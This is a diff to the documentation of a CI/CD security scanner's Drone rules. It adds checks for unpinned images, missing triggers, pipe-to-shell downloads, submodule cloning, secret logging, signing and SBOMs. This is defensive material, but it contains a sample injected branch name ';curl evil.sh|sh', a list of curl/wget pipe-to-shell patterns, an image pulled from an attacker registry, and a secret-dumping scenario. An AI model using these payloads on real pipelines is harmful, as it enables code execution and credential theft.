@@ -50,7 +50,7 @@ All other flags (`--output`, `--severity-threshold`, `--checks`,
 
 ## What it covers
 
-11 checks · 0 have an autofix patch (``--fix``).
+22 checks · 2 have an autofix patch (``--fix``).
 
 | Check | Title | Severity | Fix |
 |-------|-------|----------|-----|
@@ -59,12 +59,23 @@ All other flags (`--output`, `--severity-threshold`, `--checks`,
 | [DR-003](#dr-003) | Untrusted Drone template variable in shell command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [DR-004](#dr-004) | Literal credential in step environment / settings | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
 | [DR-005](#dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> |  |
-| [DR-006](#dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-006](#dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [DR-007](#dr-007) | Step mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [DR-008](#dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
 | [DR-009](#dr-009) | Cache plugin key embeds an attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [DR-010](#dr-010) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
 | [DR-011](#dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-012](#dr-012) | Service container image not pinned to digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-013](#dr-013) | Pipeline defines no trigger event filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [DR-014](#dr-014) | Step pipes a remote download into a shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [DR-015](#dr-015) | Pipeline clone enables recursive submodule cloning | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [DR-016](#dr-016) | Step image: field carries a Drone template substitution | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-017](#dr-017) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-018](#dr-018) | Secret-named variable echoed / printed in a step command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [DR-019](#dr-019) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [DR-020](#dr-020) | No SBOM produced (no syft / cyclonedx step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [DR-021](#dr-021) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [DR-022](#dr-022) | No vulnerability-scan step (trivy / grype / snyk) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
 
 ---
 
@@ -128,7 +139,7 @@ User-controllable substitution sources flagged by this rule:
 - ``DRONE_BRANCH`` / ``DRONE_SOURCE_BRANCH`` / ``DRONE_TARGET_BRANCH`` (branch names are pushable, so an attacker can craft a name like ``;curl evil.sh|sh``)
 - ``DRONE_REPO_*`` (in fork PRs the repo metadata comes from the fork)
 
-The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRONE_*}"``) or single-quoted uses are safe in POSIX shell because the substitution runs after Drone's templating but the shell still tokenises the expanded value as a single argument. Same model as the Tekton TKN-003 / Argo ARGO-005 / Buildkite BK-003 rules in this catalog.
+The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRONE_*}"``) or single-quoted uses are safe in POSIX shell because the substitution runs after Drone's templating but the shell still tokenizes the expanded value as a single argument. Same model as the Tekton TKN-003 / Argo ARGO-005 / Buildkite BK-003 rules in this catalog.
 
 **Known false-positive modes**
 
@@ -197,7 +208,7 @@ Pin every plugin step's ``image:`` to ``@sha256:<digest>`` or, at minimum, a spe
 ## DR-006: TLS verification disabled in step commands { #dr-006 }
 
 <div class="pg-rule__tags">
-<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-295</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-295</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
 </div>
 
 Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.
@@ -222,7 +233,7 @@ Remove TLS-bypass flags from build commands. The most common offenders are ``cur
 
 Drone's pipeline-level ``volumes:`` block accepts either ``temp:`` (an ephemeral tmpfs, safe) or ``host: { path: ... }`` (a bind mount of the agent's filesystem, the dangerous shape). The rule fires when any pipeline-level volume's ``host.path`` matches a sensitive prefix:
 
-- ``/var/run/docker.sock`` — the canonical Docker-in-Docker escape; equivalent to ``--privileged`` for container takeover purposes;
+- ``/var/run/docker.sock`` (and the ``/run`` twin, plus the ``containerd`` / ``crio`` runtime sockets) — the canonical container-runtime escape; equivalent to ``--privileged`` for container takeover purposes;
 - ``/var/lib/docker`` — exposes every image / container on the host;
 - ``/etc`` — config + credential files;
 - ``/proc`` / ``/sys`` — host kernel state;
@@ -300,9 +311,9 @@ Don't embed PR-controlled or branch-controlled Drone variables in cache keys. Th
 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
 </div>
 
-Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. The same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Argo. Drone was the missing port; this closes the gap.
+Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. The same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket Pipelines / Azure DevOps / Jenkins / CircleCI / Google Cloud Build / Buildkite / Tekton / Argo. Drone was the missing port; this closes the gap.
 
-Insecure variants matched (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.
+Insecure variants matched (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install`` without ``--locked``, ``go install`` without an ``@vN.N`` pin.
 
 **Known false-positive modes**
 
@@ -339,6 +350,334 @@ Detection is value-only and case-sensitive against the documented variable names
 **Recommended action**
 
 Pin every ``node:`` map entry to a static literal that matches your runner-targeting policy. Drone uses ``node:`` to route a pipeline to runners with matching labels (e.g. ``node: { instance: ci-prod-amd64 }``). When the map value interpolates ``${DRONE_BRANCH}`` / ``${DRONE_PULL_REQUEST_*}`` / ``${DRONE_COMMIT_AUTHOR}``, the pusher gets to pick which runner pool runs the pipeline, including a privileged pool reserved for the deploy step. Production runner pools should also carry a label the agent itself enforces (the runner's ``DRONE_RUNNER_LABELS`` env var, plus a server-side policy on which repos can target which labels) so the rule is one layer of defense-in-depth.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## DR-012: Service container image not pinned to digest { #dr-012 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Iterates ``services:`` on every container-flavored pipeline (``type: docker`` / ``kubernetes``) and fires when a service's ``image:`` value is missing the ``@sha256:<digest>`` immutable-pin suffix. Service containers run with the same network access as the pipeline's steps but are typically left at floating tags (``postgres:15``, ``redis:7``) because convention follows the application's docker-compose files; the build-time supply-chain risk is identical to DR-001's surface.
+
+**Known false-positive modes**
+
+- Dev / fixture pipelines that intentionally track the upstream service's latest minor for compatibility testing may legitimately use a tag pin. Suppress per service with a one-line rationale; production-shaped pipelines should not be suppressed.
+
+**Seen in the wild**
+
+- Mirrors DR-001 / DR-005 (step image / plugin pinning) and BK-001 / TKN-001 / ARGO-001 in the equivalent patterns: every container in the pipeline's blast radius should resolve through an immutable digest, not a floating tag the upstream registry can re-resolve.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Pin every entry under ``services:`` to an immutable digest (``image: postgres@sha256:<64-hex>``). Drone's ``services:`` block declares sidecar containers that run alongside the pipeline (databases, message brokers, object stores used by integration tests); they pull from the same registries as ``steps:`` containers and share the same patch-release-smuggle exposure window. The existing DR-001 only audits ``steps:``, so a pipeline with SHA-pinned steps and tag-pinned services has half the supply-chain control surface.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-013: Pipeline defines no trigger event filter { #dr-013 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-S-CHANGE-CONTROL</span> <span class="pg-tag pg-tag--cwe">CWE-862</span>
+</div>
+
+Fires when ``trigger:`` is missing from the pipeline document OR when ``trigger.event`` lists ``pull_request`` without an offsetting ``trigger.event.exclude`` for the same. Pipelines that explicitly opt into PR builds with secret-handling gating (``when.event`` per-step + ``protected`` repo flag) are uncatchable from the YAML alone; suppress per pipeline with a one-line rationale when the operator knows the runner configuration.
+
+Distinct from DR-003 (parameter injection at step level): this rule audits the pipeline's *event* trigger surface; DR-003 audits the step's command substitution surface.
+
+**Known false-positive modes**
+
+- Dev / fixture pipelines that intentionally run on every event (a CI hygiene smoke test, a markdown linter that's safe on untrusted forks) trip this rule by design. Suppress per pipeline with a rationale naming the intentional event scope.
+
+**Seen in the wild**
+
+- Drone CI fork-PR token leakage pattern: a pipeline with no ``trigger:`` runs on pull_request events from any fork. A malicious contributor opens a PR that modifies a step to dump ``$DRONE_NETRC_PASSWORD`` (or any other CI-injected secret) into the build log; the log is public on Drone's UI; the credential is harvested.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Add a ``trigger:`` block scoping every pipeline to the events / branches / refs that should run it. The two high-value patterns are:
+
+* Trusted-events-only for deploy pipelines:
+
+    trigger:
+      event: [push, tag]
+      branch: [main]
+
+* Deny-fork-PRs explicitly for credential-handling builds:
+
+    trigger:
+      event:
+        exclude: [pull_request]
+
+Without ``trigger:``, the pipeline runs on every event Drone supports (push, pull_request, tag, cron, promotion, rollback). Pull requests from forks have access to the pipeline's secret table by default in Drone unless the repository is marked ``protected`` at the server level; even with protection, the trigger block is the in-file audit anchor that survives runner-config drift.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## DR-014: Step pipes a remote download into a shell interpreter { #dr-014 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
+</div>
+
+Walks every ``commands:`` array on every step and fires on shell snippets matching one of the canonical pipe-to-shell shapes:
+
+* ``curl ... | sh``
+* ``curl ... | bash``
+* ``wget ... -O - | sh``
+* ``wget ... | bash``
+* ``fetch ... | sh`` (BSD variant)
+
+Pattern recognition allows arbitrary intermediate flags so ``curl -fsSL <url> | sh -s -- --version=foo`` still matches. Plain ``curl <url> > installer.sh && sh installer.sh`` is NOT caught — the file lands on disk first, which means a checksum-verify step can be inserted between download and execution.
+
+**Known false-positive modes**
+
+- Some vendor-published install scripts (rustup, nvm, brew install scripts) ship pipe-to-shell as the canonical install path. The rule fires anyway because the upstream's reputation doesn't eliminate the MITM / compromised-domain class of risk. Suppress per step with a one-line rationale naming the upstream and the operator's awareness of the unverified-pull posture.
+
+**Seen in the wild**
+
+- Codecov bash uploader (April 2021): downstream builds using ``curl -fsSL https://codecov.io/bash | bash`` shipped a tampered uploader for two months. Every CI system without pipe-to-shell detection inherited the compromise; the audit trail relied on the bash scripts' own logging, which the malicious modification could and did suppress. https://about.codecov.io/security-update/
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Replace every ``curl ... | sh`` / ``wget ... | bash`` pattern with a two-step download-and-verify flow:
+
+1. Download the artifact to disk:
+   ``curl -fsSL -o installer.sh https://example.com/install.sh``
+2. Verify a known-good checksum or signature against the downloaded file:
+   ``echo "<expected-sha256>  installer.sh" | sha256sum -c -``
+3. Only then execute: ``sh installer.sh``.
+
+The pipe-to-shell pattern executes whatever bytes the URL serves at download time, with the step container's privileges. A network MITM, a compromised mirror, or an attacker who briefly takes over the upstream domain drops arbitrary code into the build with no verification step. Pinning the download to an exact version + checksum closes the gap. Mirrors GHA-016 / BK-017 / TKN-008 across providers.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-015: Pipeline clone enables recursive submodule cloning { #dr-015 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Reads ``pipeline.clone.recursive`` and fires when set to ``true``. The default Drone clone behavior (``disable: false`` + ``recursive`` absent) is single-level: the top-level repo only, no submodules. Explicit ``recursive: true`` opts into the failure mode the rule catches.
+
+Drone's clone plugin runs before any pipeline step, so a malicious ``.gitmodules`` lands content on the runner before any user-defined verification can run. Disabling recursive cloning at the pipeline level moves the submodule fetch to an explicit step where URL allowlists and content verification are possible.
+
+**Known false-positive modes**
+
+- Some monorepo layouts use submodules for shared internal code where the URLs are known-good (github.com/<myorg>/<known-sibling>) and the convenience of recursive cloning outweighs the marginal risk. Suppress per pipeline with a one-line rationale naming the trust boundary of the submodule URLs.
+
+**Seen in the wild**
+
+- Pattern of `.gitattributes`-driven shell hooks executing during recursive clone on CI runners. Documented attacker primitive in git's CVE history (CVE-2017-1000117 et al.). Recursive submodule clone amplifies the surface by pulling content from every URL in the dependency graph, not just the top-level repo.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Disable recursive submodule cloning at the pipeline level. Three remediation patterns:
+
+* For repos that don't use submodules:
+
+    clone:
+      disable: false
+      depth: 50
+
+* For repos that use submodules but pin them at known commit SHAs:
+
+    clone:
+      disable: false
+      recursive: false   # default; clone submodules explicitly per-step
+
+* For repos that genuinely need recursive submodules at clone time, restrict via a custom clone step that verifies the submodule URLs against an allowlist before ``git submodule update --init --recursive``.
+
+Recursive submodule cloning pulls every ``.gitmodules``-declared dependency at clone time, before any step has a chance to audit the pulled content. If a contributor adds a malicious ``.gitmodules`` entry pointing at an attacker-controlled URL, the pull happens with the runner's filesystem privileges. The fetched content can include ``.gitattributes`` with filter-driven shell hooks that execute at clone time on Drone's runner.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## DR-016: Step image: field carries a Drone template substitution { #dr-016 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-94</span>
+</div>
+
+Walks every ``image:`` field (steps + services) and fires when the value contains a ``${...}`` template expression. Drone resolves these against the pipeline's environment + build-context table before image pull, so any variable that's caller-controllable becomes an image-name injection primitive.
+
+Distinct from DR-001 (image not digest-pinned), which audits the immutability shape of the *resolved* image reference. This rule fires before that resolution can happen: a templated image is unauditable at scan time regardless of whether the resolution happens to land on a digest-pinned shape.
+
+**Known false-positive modes**
+
+- Some monorepo layouts use Drone template substitution to pick service-team-specific images (``image: ${SERVICE_TEAM}-base:1.0``). The rule fires regardless because the resolution-time substitution isn't auditable. Suppress per step / service with a rationale naming the substitution variable's trust source.
+
+**Seen in the wild**
+
+- Image-name injection pattern: a Drone pipeline with ``image: ${DRONE_DEPLOY_TO}-runner:latest`` is triggered via the Drone API with ``DRONE_DEPLOY_TO=attacker.registry.example.com/`` — the resolved image is pulled from the attacker's registry and the runner executes attacker-controlled code. Documented as a real attack surface in audits of self-hosted Drone deployments with public API exposure.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Replace the templated ``image:`` value with a literal digest-pinned reference. Drone expands ``${DRONE_BUILD_*}``, ``${DRONE_COMMIT_*}``, and other build-context variables before the runner pulls the image — including variables that PR authors or promotion-script operators can influence (``DRONE_TAG``, ``DRONE_TARGET_BRANCH``, ``DRONE_DEPLOY_TO``, custom promotion parameters). A contributor who controls one of those values can redirect the image fetch to an attacker-controlled registry / tag combination.
+
+If the build genuinely needs to swap images per environment, pin each variant explicitly and select via ``when:`` predicates:
+
+    steps:
+      - name: deploy-staging
+        image: myregistry/deploy:1.2.3@sha256:abc...
+        when: { branch: [staging] }
+      - name: deploy-prod
+        image: myregistry/deploy:1.2.3@sha256:def...
+        when: { branch: [main] }
+
+The literal image references are immutable; the ``when:`` block controls execution without exposing the image identity to PR-controllable input.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## DR-017: Dangerous shell idiom (eval, sh -c variable, backtick exec) { #dr-017 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-95</span>
+</div>
+
+Complements DR-003 (untrusted ``${DRONE_*}`` variable in a command). This rule fires on intrinsically risky idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted, because the idiom hands a value full shell-grammar reach. Uses the shared ``_primitives.shell_eval`` detector and scans every ``commands:`` entry on every step. The Drone analog of GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / BK-016.
+
+**Known false-positive modes**
+
+- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## DR-018: Secret-named variable echoed / printed in a step command { #dr-018 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-532</span> <span class="pg-tag pg-tag--cwe">CWE-200</span>
+</div>
+
+Scans every ``commands:`` entry on every step for a secret-named variable handed to ``echo`` / ``printf`` / ``cat`` / ``tee``, for an ``env`` / ``printenv`` dump, and for ``set -x`` with a secret-named variable in scope (the shared ``log_leak`` detector, with GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032 / JF-042 / HARNESS-013). Variable names matching common secret patterns (PASSWORD / TOKEN / SECRET / API_KEY / CREDENTIAL) trigger the rule. Only container-flavored pipelines (which carry a shell command surface) are scanned. The Drone analog of GL-036 / CC-032.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't print secret values in step commands. Drone masks the values of named secrets in the log, but only the exact string. Encoded, truncated, or derived forms bypass the mask, and ``set -x`` / ``env`` / ``printenv`` dump the raw value before masking can catch it. Log a boolean instead (``[ -n "$TOKEN" ] && echo set || echo unset``), and avoid ``set -x`` while a credential variable is in scope.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-019: Artifacts not signed (no cosign/sigstore step) { #dr-019 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-D-SIGN-ARTIFACTS</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
+</div>
+
+Detection mirrors GHA-006 / BK-009 / CC-006 / TKN-009, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in the pipeline document. The rule only fires on artifact-producing pipelines (those that invoke ``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / etc.) so lint / test-only pipelines don't trip it. The Drone analog of BK-009 / TKN-009.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Add a signing step after the build: install cosign in the step image and call ``cosign sign --yes <repo>@sha256:<digest>`` so a re-pushed tag can't bypass the signature. Publish the signature alongside the artifact and verify it at consumption time.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-020: No SBOM produced (no syft / cyclonedx step) { #dr-020 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-S-SBOM</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
+</div>
+
+Detection mirrors GHA-007 / BK-010 / CC-007 / TKN-010, the shared SBOM-token catalog (syft, cyclonedx, spdx, bom, trivy sbom) is searched across every string in the pipeline document. The rule only fires on artifact-producing pipelines (``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / etc.) so lint / test-only pipelines don't trip it. The Drone analog of BK-010 / TKN-010.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Generate a Software Bill of Materials as part of the build: run ``syft <image> -o cyclonedx-json`` (or ``cyclonedx`` / ``spdx`` tooling) and publish it alongside the artifact, so consumers can audit the components and respond to new CVEs without rebuilding.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-021: No SLSA provenance attestation produced { #dr-021 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-S-PROVENANCE</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
+</div>
+
+Detection mirrors GHA-024 / BK-011 / CC-024 / TKN-011, the shared provenance-token catalog (slsa, provenance, in-toto, attestation, cosign attest) is searched across every string in the pipeline document. The rule only fires on artifact-producing pipelines (``docker build`` / ``docker push`` / ``buildah`` / etc.) so lint / test-only pipelines don't trip it. The Drone analog of BK-011 / TKN-011.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Emit a signed SLSA provenance attestation for the build: use ``cosign attest --predicate`` with an in-toto / SLSA predicate, or a provenance generator, so a verifier can confirm which pipeline and source revision produced the artifact.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## DR-022: No vulnerability-scan step (trivy / grype / snyk) { #dr-022 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-D-VULN-SCAN</span> <span class="pg-tag pg-tag--cwe">CWE-1104</span>
+</div>
+
+Detection mirrors GHA-020 / BK-012 / CC-020 / TKN-012, the shared scanner-token catalog (trivy, grype, snyk, clair, npm audit, pip-audit, etc.) is searched across every string in the pipeline document. Fires on any pipeline that runs no scanner (the build ships without a CVE signal). The Drone analog of BK-012 / TKN-012.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Add a vulnerability-scan step to the build: ``trivy``, ``grype``, ``snyk``, ``npm audit``, or ``pip-audit`` over the image or dependency tree, and fail the build on findings above your threshold so known CVEs don't ship to production silently.
 
 </div>
 
